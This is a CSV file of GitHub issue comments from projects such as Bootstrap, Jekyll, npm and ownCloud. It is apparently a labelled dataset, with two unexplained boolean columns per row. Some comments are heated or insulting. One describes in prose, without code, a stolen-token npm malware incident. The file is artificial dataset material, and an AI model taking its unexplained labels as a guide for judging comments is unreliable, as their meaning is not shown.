termux-packages/termux/2735/413360303,termux-packages/termux/2735,"@friend You reacted with a laugh emoji; Is contributing to Termux only to see your contributions deleted (run afoul) really as funny as you stated with your laughing emoji? Both  and  are down with the latest Termux updates.  This is not funny @friend.  It's a headache for me to keep these projects running while I get, ""broken because it's NOT Termux"" from you and our PhD candidate @friend who, btw, enticed me to contribute to Termux @ Wikipedia, only to delete our mutual group effort to promote Termux worldwide.  Why did you do this @friend? ",False,True
jekyll/jekyll/6948/383690460,jekyll/jekyll/6948,"Adding fetch / get for datafiles to core (or as an ""official"" addon/plugin) would be great, see the unloved / public domain source @   The code itself is about 40 lines, see ",False,True
Skript/SkriptLang/1568/425709620,Skript/SkriptLang/1568,Use the bigger code blocks or hastebin or pastebin for errorrrs bcause this is hard to read ,False,True
react-helmet/nfl/373/448062956,react-helmet/nfl/373,"Wow, people are rude. ",False,True
puppeteer-sharp/kblok/736/435939574,puppeteer-sharp/kblok/736,"Sort of, it's a ""weird specie of a bird"", That is synchronous but it waits for Tasks to be executed ",False,True
react-native-camera/react-native-community/1897/439862638,react-native-camera/react-native-community/1897,@friend Can you tell me how did you solve this problem.. I got the url from this and I saved using cameraroll component to gallery and that also returned a url but teh video is not playing in android? In iOS the video is not appearing in gallery ,False,True
core/owncloud/8282/41027737,core/owncloud/8282,@friend would it be possible for you to test this on the github master branch? We adopted the zip generation heavily for OC7 and I guess this issue will be solved. ,False,True
dev/nethesis/5435/403033592,dev/nethesis/5435,in   nethcti-server3-3.1.0-1.2.g3677e4e.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.2.g3677e4e.ns7.x86_64.rpm  ,False,True
lxqt/lxqt/1628/441437645,lxqt/lxqt/1628,"Could you please name some such distributions which add  to $XDG_CONFIG_DIRS outside of LXQt session? Because LXQt contains a hack to add it explicitly if $XDG_CONFIG_DIRS wasn't set. I really want to check it out. I'd prefer more mainstream distributions, if that's possible. Well, loading example configs is not a bug, but it is an issue when application would unexpectedly load them, because application installed example configs to $XDG_DATA_DIRS, not $XDG_CONFIG_DIRS. In my opinion those two are separate entities which are better to be kept separate. Otherwise, why did standard make them separate? ",False,True
openDCIM/samilliken/1114/450151384,openDCIM/samilliken/1114,It's already user defined in the configuration screen. ,False,True
bootstrap/twbs/3057/5141814,bootstrap/twbs/3057,"@friend .. you have made me feel clean!  I use ;'s as separaters and {}'s only for multi-line blocks, not single line blocks.  I've come out of the closet! ",False,True
termux-packages/termux/2735/413326468,termux-packages/termux/2735,I would like to know the answer to this straightforward question. ,False,True
AKS/Azure/287/455953278,AKS/Azure/287,"It is now 2019, any update of a deployment/rollout date for each region? ",False,True
rdpwrap/stascorp/645/457692969,rdpwrap/stascorp/645,"Hello to everybody. I updated rdpwrap.ini and everything looks perfect   but when I try to connect from another computer, I still have message ""Another user is signed in...etc"" Please, do you have any sugestion? ",False,True
jenkins/jenkinsci/2355/219547731,jenkins/jenkinsci/2355,"@friend @friend Seems we were using different IRC chats, but 👍 for going forward ",False,True
forum/standardnotes/39/425479015,forum/standardnotes/39,I would like to be able 'alt-tab' through notes and folder + and agree with what another user suggested ,False,True
METADATA.jl/JuliaLang/7295/267093991,METADATA.jl/JuliaLang/7295,You should actually still make an 0.7.2 tag for this. Anyone who upgraded to the original 0.7.1 might not see this update at all. ,False,True
SickChill/SickChill/5159/435687584,SickChill/SickChill/5159,"Yubikey bought, thanks for donation!  ",False,True
npm/npm/20791/392628846,npm/npm/20791,"I'm gonna lock this for now, because I'm sure it's gonna get plenty of traffic. You really don't need to respond to repeat what every other poster is saying. The registry team has been informed. ",False,True
primitive/haskell/71/354366594,primitive/haskell/71,"I've been tested with GHC HEAD for many years, and releasing packages to Hackage specifically to deal with GHC HEAD. To me, the process still hasn't changed (although I appreciate it has to the rest of the world). If the decision of the primitive maintainers is to not release until GHC goes into Beta, that's fine, but the resolution of this ticket should be ""Open"" and the comment should be ""We'll fix it when GHC goes into Beta, if you disagree email ghc-devs"". ",False,True
Doomsday-Trail/AnthonyMarc23/1/335396060,Doomsday-Trail/AnthonyMarc23/1,@friend check it out ,False,True
FastAdapter/mikepenz/695/401860439,FastAdapter/mikepenz/695,"@friend , hahaha i have 3 days working for that and my head now is totally stucked D D , please if you can rewrite my implementation in the comment above that i have writted my class and implementation how i add or delete items D D D , you don't have other choice hahahaha, thanks ",False,True
flutter_webview_plugin/dart-flitter/60/379993470,flutter_webview_plugin/dart-flitter/60,"I found this today, we may be able to do this, but will require changes to the plugin. See  Another way that can work is to pass a url like ""file///data/data/com.provider.package/file_name.html"" but you will need the exact file path of the HTML. I didn't manage to do this though because my assets are inside the assets folder of my project, and those are not placed in any kind of permanent directory. ",False,True
jekyll/jekyll/6948/422570076,jekyll/jekyll/6948,"(I suggest this without understanding what would actually be involved in doing it) I'd love to see performance work done regarding glob patterns in frontmatter defaults. I think it's a tremendously useful feature, but it's hampered by the fact that the more useful it is for a project, the more detrimental it is to build times. I use this feature heavily in scenarios where I have a collection of documents which represents different variations of a type of content. For example, in the Sentry marketing resources ""resources"" is a collection, which is broken up into folders representing podcasts, videos, and pdfs. Each of those folders has it's own defaults that are appropriate for the given medium. In smaller collections there isn't much of an issue, but on our docs site, where a collection is 250+ pages, using a wildcard added 2s to a .8s build. ",False,True
Laravel-Excel/Maatwebsite/1167/376088747,Laravel-Excel/Maatwebsite/1167,Great Job. Closed. Gone like the wind ,False,True
core/owncloud/8282/41335529,core/owncloud/8282,"That's exactly what I mean, the archive is not created on the server-side properly. I also use 7zip. ",False,True
courseplay/Courseplay/3219/463005046,courseplay/Courseplay/3219,"same for myself as well, same version ",False,True
NanoCore/NanoAdblocker/87/356460317,NanoCore/NanoAdblocker/87,"i dont think he wanted whitelisting. if you have experimental or generic filterlists that work well most of the time but occasionally break sites then you want to quickly disable the list for this specific website but not in general and you do not want to go through the dashboard every single time you visit that site again. you should also contact the maintainer but it will take time until it is fixed. you could even just move along and after a few weeks you look up your dynamic rules and post a bug report with all the problems you collected over time but were too lazy to report at that moment. well, unlikely but at least possible ",False,True
AKS/Azure/132/466024730,AKS/Azure/132,"In summary (for everyone scrolling to the end hoping on some positive message) currently  no Vertical Scaling   no Additional Node Pools  discussed, planned, promised but never delivered  Additional node pools.  This is frankly kind of insane. This means that you have to predict perfectly what scaling size you want to work with during testing/staging since it will be the same as production. ",False,True
rippled/ripple/2241/335243297,rippled/ripple/2241,"It is a bug with how the  RPC is handling the default ledger range. Until we land a fix, you will need to specify a minimum or maximum range for the ledgers. A value of  means to use the minimum/maximum available validated ledger, but the command line parser thinks  is a flag rather than a number. Can you try the following for now and see if it works? ",False,True
bedtools2/arq5x/572/331759110,bedtools2/arq5x/572,Thanks for reporting this.  I just pushed a fix to the repo. ,False,True
Elgg/Elgg/12126/410195763,Elgg/Elgg/12126,"Just to be clear, Elgg can't loose compatibility as it was never officially supported ;) We had the MariaDB issue with a client on 2.3. and it wasn't so much Elgg core but a plugin. We couldn't figure out what was wrong as everything worked fine on our development PCs but it just wouldn't work on the clients server. After much debugging we found the issue in a SQL query. after a bit of rewriting we got it working on both MySQL and MariaDB. ",False,True
Elgg/Elgg/6779/41463346,Elgg/Elgg/6779,"Agree with @friend @friend I was asking you to check elgg toggle functionality in general, just to know if it's working at all. As examples, try to open/close widgets, try to open/close Admin options menu. ",False,True
react-helmet/nfl/373/407984219,react-helmet/nfl/373,"@friend Gotcha! Well in that case,  solves the problem because deepEqual never gets called in  as the component re-mounts instead of updating. Hence, no stack overflow. Was very useful in my case. ",False,True
jekyll/jekyll/6948/387794045,jekyll/jekyll/6948,"I'd like an additional YAML file that defines site-wide variables so other programs can generate the file safely (instead of appending to ). It could be better if we can have something like  in  but I don't think it's necessary. Just allow loading extra variables from another file, even if the file name is hard-coded, would be enough. A typical use case would be when I write a custom script that pre-processes some file and show in the information generated site ",False,True
coffeescript/jashkenas/4056/127795420,coffeescript/jashkenas/4056,I wonder if it makes sense to publish a separate entry in npm for just this one thing?  Just musing... ,False,True
core/owncloud/8282/40958599,core/owncloud/8282,@friend I'm no quite sure if I understand your issue correctly. Can I ask you to follow our contributions guidelines?  the use of our issue template ,False,True
GoMint/GoMint/406/434016443,GoMint/GoMint/406,There are fixed numbers of threads used in Gomint 1 for async loading/saving/chunk population per world 1 for ticking worlds and entities 1 for networking Timings are on the todo list but they won't be finished any time soon. But they will for the first stable release ,False,True
FastAdapter/mikepenz/695/401849860,FastAdapter/mikepenz/695,"Hi, you can provide your own item list implementation to any model adapter. ",False,True
jekyll/jekyll/6948/387790643,jekyll/jekyll/6948,"One more suggestions (I'd be happy to help along) - The Jekyll Documention is fantastic and outstanding. But, what's wrong (or better how to make it more awesome)? Currently the documentation is part of the jekyll repo  and the layouts, styling, build scripts etc. is part of the documentation too - it's all mixed together. What's wrong with that? I'd say with its own dedicated markdown files in a repo it would be easier to contribute / edit / retarget etc. and with a ""proper"" docu (remote) theme  in its own repo it would be easy to reuse and change the theme too.   A while ago (dare I say years) I started to ""clean up"" as an example the documentation use ""plain vanilla"" markdown files in the manuscripts (book/documentation) format. See the Hyde Press Bookshelf live  and all the source repos  For the suggestion for Jekyll 4.0 it would just be a  new theme repo and a new docs repo (with markdown only). Would be great to see some booklets / guides / tutorials that could be made easily from the new docs repos using some (selected) pages etc.   Let me (us) know what you think. ",False,True
termux-packages/termux/2735/412910767,termux-packages/termux/2735,The problem is that . ,False,True
Elgg/Elgg/12126/410330782,Elgg/Elgg/12126,We can create a vagrant box for you ,False,True
normalizr/paularmstrong/358/428584680,normalizr/paularmstrong/358,There's a lot of manual process involved. Please forgive me for being strapped for time. ,False,True
Osmand/osmandapp/3663/407216416,Osmand/osmandapp/3663,"@friend It has been a long time since I looked at that code, and I think it has been stable ever since From what I remember, this is about how we do it We look at the angular change a turn after a fork eventually takes you through vs. your initial bearing. If it is between 10 and 45 degrees, a ""Keep Left"" respectively """"Keep Right"" turn type is detected. So I assume that ""false"" announcements may happen where a road forks, and both forks are a slight turn. While driving on one of them, you may perceive this as 'going straight', but looking at an aerial view, you may realize you take one of 2 slightly bent forks legs. I do think we factor in the hierarchy of roads, so this will probably not occur if you are and stay on a primary road, and an unused trail forks in one of its turns. But I am not sure if it may happen in certain forks between a motorway and a motorway link.  And it may be justified there, e.g. some motorway intersections / cloverleaves may be tagged with a mixture of motorway on motorway links on forks which look of rather equal hierarchy when driving on them (vs. in the exit situation you may argue that staying on the motorway requires no turn prompt.). ",False,True
coc.nvim/neoclide/305/450519037,coc.nvim/neoclide/305,"I will not implement this, since there's no spec of how signature should stored in complete item, and I don't like guess like what echodoc does. When you select a complete item, you can type more character or remove character to make it a different function call, it call be solved, but I don't think necessary. ",False,True
nativefier/jiahaog/29/188658178,nativefier/jiahaog/29,"plus one, really miss this  / ",False,True
minecraft-bugs/tryashtar/864/339511914,minecraft-bugs/tryashtar/864,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Feb 9, 2013 Ok, Reopened. ",False,True
angular.js/angular/14436/246747683,angular.js/angular/14436,@friend Could you provide an example? I am sure that the upload event thing works on my projects. ,False,True
moose/idaholab/12263/427485113,moose/idaholab/12263,"What do you mean?  They .py file just says what columns to plot, what to label the axes, etc.  You gotta put that somewhere. ",False,True
godot/godotengine/28739/490229439,godot/godotengine/28739,"Confirm on Wine 4.7, this is backtrace(very strange because wine or cross compilation doesn't work well) Dokument bez nazwy.txt ",False,True
lxqt/lxqt/1628/441443115,lxqt/lxqt/1628,It seems I wasn't the only one who didn't read comments carefully... Agreed. ,False,True
NanoCore/NanoAdblocker/87/356580154,NanoCore/NanoAdblocker/87,like this?  ,False,True
angular.js/angular/1463/40134603,angular.js/angular/1463,@friend this is charted for 1.3.0. We're getting to it. See  for a perfectly reasonable solution you can use for the time being. ,False,True
angular.js/angular/1463/40134905,angular.js/angular/1463,@friend I did not know thanks!! That is really good news! I take back my words then -) plus one ,False,True
npm/npm/21202/404507723,npm/npm/21202,"@friend shortly, the npm credentials have been stolen and malicious release has been made directly to npm (not GitHub). The malicious code ran upon  and attempted to transfer the npm authentication token from  to remote server. Surprisingly the tampered code only contained a bootstrap script that downloaded and executed the script (with ) from pastebin. Curious thing, all tampered files had the modification date set to Oct 26, 1985. So I guess now we know the birthday of whoever who did this. 😆 All of what happened is something to think about, why didn't npm spot the calls to  and reject the update. I know many packers use  as well but come on, it's not 1999 again. ",False,True
core/owncloud/27775/301207633,core/owncloud/27775,Same here - still having this even after apt clean ,False,True
core/owncloud/26374/253995433,core/owncloud/26374,"A perfect base to get help  Being impatient Flooding the issue with unnecessary comments instead of using the edit button Throwing stuff like ""should i move to nextcloud"" around -&gt; They mostly also don't want such users Thinking that a bugtracker is an instant support channel  What you could do here to actually provide all needed info once some one has time too look after this is, to strip down / delete all your comments and collect all real info which you think are relevant for this issue in your initial report. ",False,True
i2cdevlib/jrowberg/252/264188924,i2cdevlib/jrowberg/252,@friend OBRIGADO! ) @friend the clone that I bought is from this seller  this  never bought it from eBay or Aliexpress. ,False,True
core/owncloud/27775/298660133,core/owncloud/27775,Just leave the issue open until a repo maintainer fix the issue. ToR ,False,True
bootstrap/twbs/3057/5139250,bootstrap/twbs/3057,"The solution to a problem like this is very simple. Project maintainers need to consider who the target audience for their project is, and maintain their project in such a way as to properly set and meet the expectations of that target audience. I would imagine that the target audience for Twitter Bootstrap generally  doesn't know the rules of JavaScript ASI doesn't know how to choose the right tools doesn't understand how to debug errors in the tools they use needs all the help they can get  Which means that it might be a good idea to consider  adopting a coding style that does as much as possible to help keep them out of harm's way documenting things the project does that might not conform to their expectations making explicit recommendations on tools and processes  Ever since I started actually teaching JavaScript, I've learned a lot about how to help reluctant JavaScripters (read the 99%) read and write code. Omitting all semicolons except where absolutely necessary for proper ASI definitely doesn't help them. Also, when responding to a user issue like this one, consider the first list. The user doesn't know what tool they should be using. The user doesn't know what's really going on. They've most likely inherited some arcane stack of tools that they can't discard, and need all the help they can get. (and passing the buck isn't really ""help"") ",False,True
i2cdevlib/jrowberg/252/266059340,i2cdevlib/jrowberg/252,"Sorry to be late to the party. I had struggled with what I believe was the same problem; the program would run and then randomly lock up. I have to echo what slesta came up with. In the file ""MPU_6050_6Axis_MotionApps20.h"" down at line 266.  I changed the 0x01 which is 100HZ to 0x02 which is about 66HZ and I get a pretty reliable readout. I have yet to test it on a mobile platform, but it is pretty funny to have it in the car with me and watch it give me yaw information when I turn.  My set up is an Ardunino Nano V3.1 with a Level Translator Breakout - PCA9306 to interface with the MPU.  Yaw drifts about 1 degree every minute and a half or so but for my application this should work. Hope this helps. ",False,True
caniuse/Fyrd/4428/349598366,caniuse/Fyrd/4428,Supported in Chrome Android since 35 ,False,True
core/owncloud/27775/301240036,core/owncloud/27775,"I haven't the foggiest why I see 9.1.5 in ""stable"" where many other people still see 10.0. The only thing I might've done differently is that I changed my sources list to use the 9.1 PPA, so for this test I had to change it back to ""stable"", then run . Perhaps some of you could try to change and restore the repo, and see if that makes a difference. Also, could someone post the output of ? ",False,True
rdpwrap/stascorp/645/458182012,rdpwrap/stascorp/645,"Does the problem go away when you uncheck ""Single session per user"" and ""Apply""?  What version of Windows are you on? 8.1? Server 2012? ",False,True
Osmand/osmandapp/3663/296779087,Osmand/osmandapp/3663,"@friend  can't recall exactly which junctions, (it may actually be the M8, not the M9) but it certainly does it.  In fact, it does it so often that I can't recall specifics, I just thought it was 'a thing'. Also, with this junction  the instruction issued was ""keep right"" which is totally unecessary, and in fact confusing given it's a crossroads (which is why I recall it specifically).  There have been a couple of occasions where 'keep right' has been read out where it actually meant 'take the right hand exit' at a fork (which is why I wasn't sure if it was just bad data from OSM or not). Again, for the exits, it's happened so often that the sharp/slight turns aren't mentioned at all when they might have been necessary, and mentioned where there was no need, and in a couple of instances just completely wrong, that I've just bundled it up as 'something wrong with the OSM data/something silly that OSMand does' that I don't even think about specifics any more, it just frustrates me every time.  My brain translates it as 'check what the map shows because that will give you more information than the audio' which defeats the purpose a little. ",False,True
ansible/ansible/13262/285892797,ansible/ansible/13262,"@friend While I would love to see this functionality added, in the context of Ansible I don't think it's nearly as important as you are implying. Needing loops like this is rather an edge case in Ansible, and there are not many situations where you can build those loops while maintaining idempotency. ",False,True
openDCIM/samilliken/1114/450204639,openDCIM/samilliken/1114,,False,True
pypi-legacy/pypa/759/357006793,pypi-legacy/pypa/759,"@friend Thank you for your thoughtful response. @friend, Thanks for your feedback! PyPI does not currently and does not plan to implement any policies regarding removal of packages based on their perceived quality. Once PEP 541 is implemented there will be recourse for abandoned projects, name conflicts, and legal issues. ",False,True
openvpn-client/dperson/165/445486041,openvpn-client/dperson/165,"and that I don't see that becoming true. As I said there is no dhcp server anywhere in that, unless the vpn that your container is using is a private one where the openvpn connection act as a dhcp relay, or you attach your container to another network. And now you are telling me that the vpn is providing addresses... LOL show me where PIA is giving away multiples addresses on one connection. And no there is no ip assigned even in the container itself ",False,True
core/owncloud/8282/40971171,core/owncloud/8282,Thx Von Samsung Mobile gesendet -------- Ursprüngliche Nachricht -------- Von Ricky Burgin notifications@friend.com  Datum21.04.2014  2151  (GMT+0100)  An owncloud/core core@friend.github.com  Cc Thomas Müller thomas.mueller@friend.eu  Betreff Re [core] Download as zip fails when contents contain non-ASCII   chars (#8282) テスト試し ^ An example set of chars for you to try. — Reply to this email directly or view it on GitHub. ,False,True
np/sindresorhus/185/334705622,np/sindresorhus/185,That's a pretty big drawback. Do you know how long the token is valid? ,False,True
bootstrap/twbs/3057/5137659,bootstrap/twbs/3057,@friend I think the point is  vs ,False,True
rdpwrap/stascorp/611/447061310,rdpwrap/stascorp/611,It works on 10.0.17763.168. I also struggled but if you follow the steps above you'll see it can work ,False,True
jekyll/jekyll/6948/390288255,jekyll/jekyll/6948,"Thus Jekyll is focused to create mostly frontend-only sites... it would be awesome to have a better way to organize our  in partials and get an  as a result. This way we could place all our partials in a  (defaults could be maybe ) and specify the output style with a style option in the  file like I know we have this with CoffeScript, but it is now fading away and  rising and raising due to the fact that  is an excellent modern CoffeeScript alternative. TL;DR It'll be very cool to see GitHub Pages sites with minified ES6 created from well structured javascript partials. ",False,True
SevTech-Ages/DarkPacks/2626/392102126,SevTech-Ages/DarkPacks/2626,This should be considered a bug simply because it is a huge gate in a players progression and will resort in people either rage quitting or having to cheat due to an easily avoidable fix we can add in the pack. ,False,True
bootstrap/twbs/8662/17299941,bootstrap/twbs/8662,Are you serious guys? No more gradients and no more shadows? Should this be a button?  No it isnt!  And its a terrible decision to follow design regressions like Windows 8 and iOS7. How dare you! ,False,True
pyinstaller/pyinstaller/3160/355027317,pyinstaller/pyinstaller/3160,"Please see the ""maintainer note"" in ",False,True
angular.js/angular/1463/26264386,angular.js/angular/1463,plus one for this - attempting to use angular.js with mongo (very common?) is a massive pain in the rump ,False,True
AKS/Azure/132/409609776,AKS/Azure/132,"We are hoping to have node pool support by the end of September Thanks Saurya  From Eder Nucci notifications@friend.com Sent Wednesday, August 1, 2018 80748 AM To Azure/AKS Cc Saurya Das; Mention Subject Re [Azure/AKS] Changing node vm-size of existing cluster (#132) @friend unfortunately MS is not giving us any ETA on any AKS issues. This is really frustrating. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True
Semantic-UI-React/Semantic-Org/2550/368406941,Semantic-UI-React/Semantic-Org/2550,I think we're ready to go here.  Changing labels. ,False,True
serverless-stack-com/AnomalyInnovations/63/359280247,serverless-stack-com/AnomalyInnovations/63,"I'm getting the following response, ""npm ERR! missing script build"" What can I do to address this? ",False,True
reportbook/Jimdo/506/331823298,reportbook/Jimdo/506,Implemented in #507 ,False,True
rails/rails/1917/1477989,rails/rails/1917,"To nitpick, what you call ""release notes"" is also a blog post. The links @friend provided also talks a lot more about this. ",False,True
ForkHub/jonan/56/141524566,ForkHub/jonan/56,GitHub's rate limit is quite limited for unauthenticated requests. This might be an issue if we want to implement this feature. ,False,True
bootstrap/twbs/3057/5141214,bootstrap/twbs/3057,"@friend I love your choice of !== rather than != ) I'd say (which is not at odds with your assertion) parse == ""build a complete and accurate syntax tree"" After all, ! has side effects and a more complex AST on the client. Play with  and see. Anyhow, back to taxes... ",False,True
bootstrap/twbs/3057/6214808,bootstrap/twbs/3057,I missed parts of this. What did we all agree on in the end? ,False,True
nokogiri/sparklemotion/1709/361064638,nokogiri/sparklemotion/1709,Note that commit bf94cf5 was added to master to make windows tests less brittle. ,False,True
termux-packages/termux/2735/413295173,termux-packages/termux/2735,,False,True
bootstrap/twbs/13327/40258584,bootstrap/twbs/13327,Thanks for the unhelpful response.  You obviously didn't read the question because the issue is happening when bundling is DISABLED. The same error occurs when I include the bootstrap css in a &lt; link &gt; tag. But thanks for your 2 seconds anyways. ,False,True
bootstrap/twbs/3057/5167594,bootstrap/twbs/3057,"Tried that.  The eyes thing, I mean.  Then I licked the screen and didn't taste it.  Also tried Braille.  Nope.  Even checked the top of the page, to see if there was some confusion there.  Nope again. Junk filter implemented.  Thanks anyway. ",False,True
zfs/zfsonlinux/7401/312114336,zfs/zfsonlinux/7401,"System information  Type                                | Version/Name   ---                                  |     ---  Distribution Name       | Scientific Linux Distribution Version    | 6.8 Linux Kernel                 | 2.6.32-696.23.1.el6.x86_64 Architecture                 | x86_64 ZFS Version                  | 0.7.7 SPL Version                  | 0.7.7 Describe the problem you're observing Data loss when copying a directory with large-ish number of files. For example,  with 10000 files in SRC is likely to result in a couple of ""cp cannot create regular file cpcat DST/FOOecho 3 &gt; /proc/sys/vm/drop_caches reports N fewer hard links than SRC, where N is the number of files for which  reported ""No space left on device"" error. Names of missing files are mostly predictable if SRC is small. Scrub does not find any errors. Describe how to reproduce the problem Include any warning/errors/backtraces from the system logs ",False,True
react-helmet/nfl/373/407988469,react-helmet/nfl/373,"Well, you only have to update the key when the underlying children change. In my case that happens when that particular view URL changes, but you can use any string representation. Maybe someone has a react-router match.params change which updates the title or meta information - that'd be a good spot to use  IMO. Anything where state affects the children. ",False,True
ARKStatsExtractor/cadon/850/446800019,ARKStatsExtractor/cadon/850,"Assuming all provided information is correct (I'll take your word for it), you admin spawned this Tek Rex or it was generated some other way other than it being tamed. It's current level, 648, is it's post tamed level, you have a TE of 100%, and the only possible way to have 0 domestic levels with 100% TE is the creature was found in the wild at level 432 based on the (proven) level calculation of 432  (1 + (0.5  1)) =  648. The equation is PreTameLevel  (1 + (0.5  TE)) = PostTameLevel. If the creature has 0 domestic levels, it's current level MUST equal its post tame level. If any of this is incorrect, that will completely change the TE and the extracted pretame level. If you'd like further assistance, please provide the requested information. ",False,True
HandBrake/HandBrake/1517/410339420,HandBrake/HandBrake/1517,"There is a reason we tell people not to try rip directly from discs. libbluray isn't designed for handling copy protection. (Structural protections, deliberate errors etc). MakeMKV is and they have a massive amount of experience that allows them to better detect fatal vs non fatal errors and in many cases recovery / workaround problems much better than pretty much most other tools out there. They'll have a ton of code to handle the thousands of scenarios that now come up and change with every new disc released.   Much in the same way we recommend running stream repair tools before dealing with OTA recordings in HandBrake. There are tools specialised just to that file type. As far as HandBrake can tell, there isn't a problem here so it did the correct thing in not failing the encode. The error here isn't fatal and won't always result in a failed encode. I reckon, if we flagged every decoder error we see, we'd see a 60+% failure rate on encodes across millions of users.  That's never going to end well for anyone, especially when a large percentage of those won't actually have resulted in failed encodes.  So, our options are actually very limited. Unfortunately, looking at the logs is not sufficient to tell if you have good encodes. No matter what software you use, the only way to be sure is to watch the entire file and pay very close attention to it.  Same with MakeMKV. We've seen it be successful but data that it read was incorrect without error due to marks on discs or whatever. ",False,True
officer/davidgohel/141/336310576,officer/davidgohel/141,doesn't work body_add_docx method ,False,True
bety/PecanProject/568/362055829,bety/PecanProject/568,@friend this is assigned to you - can you deploy this so it can be tested? ,False,True
Skript/SkriptLang/1568/425569223,Skript/SkriptLang/1568,but my other leaderboard works fine ,False,True
angular.js/angular/9004/59026338,angular.js/angular/9004,@friend please tone down your comments ,False,True
HandBrake/HandBrake/1584/435215570,HandBrake/HandBrake/1584,"How many times would you like to go through this and similar suggestions, accuse others of not taking your ideas seriously despite hours of consideration over days in public and private, and meet our constructive responses with argumentative and harassing behavior? We've presented nothing but kindness in good faith. I encourage you to read our Code of Conduct. Nothing we've read from you in our recent interactions respectful of opposing viewpoints, gracious in light of constructive criticism, empathetic, or fostering community. In short, it is clear our views differ; that does not give you a right to behave badly. Harassment in public or private will not be tolerated. This topic is now closed and locked, same as #1657. Feel free to address further concerns with me and/or other team members directly. ",False,True
dev/nethesis/5435/405541404,dev/nethesis/5435,in   nethcti-server3-3.1.0-1.8.g92b536c.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.8.g92b536c.ns7.x86_64.rpm  ,False,True
Skript/SkriptLang/1568/425702576,Skript/SkriptLang/1568,so what can i do? ,False,True
jekyll/jekyll/6948/383754782,jekyll/jekyll/6948,"I'd love to see automatic generation of tag and category archive pages in core (plugins like jekyll-archives do this, but none are whitelisted in GitHub Pages). I wrote up #6952 with my detailed rationale and a proposal of how it could work. Here's the TL;DR Code-wise, this snippet gets most of it across ",False,True
bootstrap/twbs/9643/22735691,bootstrap/twbs/9643,"Sorry about that; I'm a little tipsy. I'm just somewhat surprised, and wanted to express that. No hard feelings. ",False,True
react-popper/FezVrasta/111/379496783,react-popper/FezVrasta/111,"@friend If you looked at the linked issue over at the SharePoint Framework side in my original report, you would see that I'm not the only one with this problem; and that it's not unique to my combination of packages.  Sure, people might not be reporting it directly here, but that's because they're indirectly consuming your package via npm's version of dependency hell, not using it intentionally or knowingly! ",False,True
expo/expo/3030/451747152,expo/expo/3030,"@friend okay, thanks for the feedback anyway! ",False,True
puppeteer-sharp/kblok/736/435935614,puppeteer-sharp/kblok/736,What is  doing? ,False,True
opencv/opencv/12198/412349242,opencv/opencv/12198,Its unfortunate that there's so much cautionary documentation about ffmpeg and friends but not such a word about this. But I guess it makes sense since it's Intel that you're agreeing to in this case. ,False,True
primitive/haskell/71/353456554,primitive/haskell/71,"Use hackage head.  It has everything building for head On Thu, Dec 21, 2017 at 322 PM GeorgeCo notifications@friend.com wrote ",False,True
electron/electron/17171/474253256,electron/electron/17171,"Hi @friend , though I can understand your frustration I think you just missed a point here. You're not on a support forum and electron is an open-source project, with volunteer contributors. You cannot expect any level of support, just hope for it. It would have been nice from you to share your findings once you solved your problem, that's the way it works. ",False,True
zfs/zfsonlinux/7960/458315146,zfs/zfsonlinux/7960,"The discussion in this thread (now hidden) has not been productive.  In the future, please speak respectfully to fellow contributors.  @friend and I are working on putting a process in place for handling inappropriate behavior.  In the mean time, please feel free to contact either Brian or I privately if you have concerns about the behavior of ZFSonLinux community members. ",False,True
bootstrap/twbs/3057/18446815,bootstrap/twbs/3057,Relevant We use semicolons everyday ,False,True
eiffel-remrem-semantics/Ericsson/37/278934457,eiffel-remrem-semantics/Ericsson/37,As I understand my remaining comments will be fixed in a coming pull request. I can accept that. ,False,True
bootstrap/twbs/3057/5148030,bootstrap/twbs/3057,"Javascript is neither pyhton nor ruby.. Learn to use semicolons, actually learn language you use properly. I can't understand why everybody is talking about semicolon everywhere. Before starting to code, learn language.. ",False,True
bootstrap/twbs/3057/5262264,bootstrap/twbs/3057,@friend this argument is the best reason to add semicolons to the spec. QED — as was demonstrated by this argument. A couple regex replacements could fix pretty much all of that. Wasting time on dumb little disagreements is the real web-breaking problem. ■ ,False,True
homebrew-cask/Homebrew/52035/422352892,homebrew-cask/Homebrew/52035,"That’s good to know in hindsight. For reasonable users, like you seem to be, there’s usually one good argument that makes our point across. The problem is we don’t know which one it is (or if the user is reasonable)! Also note the situation could be entirely reversed. You could have gotten a more rushed explanation from me an insightful one from @friend. It just so happens he was the first to reply and was probably doing a ton of things at the same time. When I’m reviewing a bunch of issues/PRs in a row, sometimes my replies can seem curt. ",False,True
cdnjs/cdnjs/13175/449974228,cdnjs/cdnjs/13175,@friend should be the #13166 problem ,False,True
bootstrap/twbs/7482/16069994,bootstrap/twbs/7482,"There's nothing inherently true about that, Steve. ",False,True
TotalFreedomMod/TotalFreedom/2004/392533441,TotalFreedomMod/TotalFreedom/2004,@friend What was the reason for the issue closing? ,False,True
react-helmet/nfl/373/442728992,react-helmet/nfl/373,"I believe it's merged to  branch, we need to wait them to release a new version ",False,True
Kosmos/AtlasNX/187/465083779,Kosmos/AtlasNX/187,"That is t very user friendly. What I'm saying is by default it will be off, unless you already have es patches installed then it will be turned on. I think this fulfills what you are asking. I'm not going to hide the option as that only leads to confusion to the end user. ",False,True
nokogiri/sparklemotion/1709/357495804,nokogiri/sparklemotion/1709,I am currently having the same issue ,False,True
docxtemplater/open-xml-templating/184/161537660,docxtemplater/open-xml-templating/184,"The documentation says something like by default the nullGetter is set to this function. I was expecting some JavaScript code showing the default function. But it's not there.  Maybe I'm just misunderstanding the docs? On Thu, Dec 3, 2015 at 806 AM, Edgar Hipp notifications@friend.com wrote ",False,True
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357419177,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942,"I always like feedback, but constructive feedback.  You're issue can effectively be boiled down to ""I enabled this feature and I don't like what it did, I recommend you remove this feature"" which IMO is barely feedback and definitely not constructive.  If you have a proposal to improve that feature in some way to meet your desired UX then raise that instead. ",False,True
Laravel-Excel/Maatwebsite/1768/415858492,Laravel-Excel/Maatwebsite/1768,"We offer support on based on best effort. If you don't respect that, than we can't help you. Our software is fully optional. ",False,True
